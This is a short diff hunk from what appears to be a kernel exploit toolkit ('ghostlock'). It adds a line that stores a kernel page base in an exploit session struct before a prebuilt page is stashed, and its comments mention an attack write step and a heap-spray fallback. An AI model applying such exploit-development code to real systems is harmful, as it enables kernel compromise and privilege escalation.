@@ -909,6 +909,12 @@ namespace ghostlock::support {
         if (!base) {
             return false;
         }
+        /* attack_write owns the heap.current.base store on the regular path
+         * (it assigns prepare_good_kernel_page's return value itself); the
+         * stash below moves the whole page struct, so the base must be in
+         * place HERE or the activated prebuilt page shows base=0 and the
+         * route bails with "missing kernel page base" (step 30). */
+        session::g_exploit_session.heap.current.base = base;
         if (!stash_prebuilt_page()) {
             pr_warning("prebuilt stash failed; W3-0 falls back to its own spray\n");
             return false;
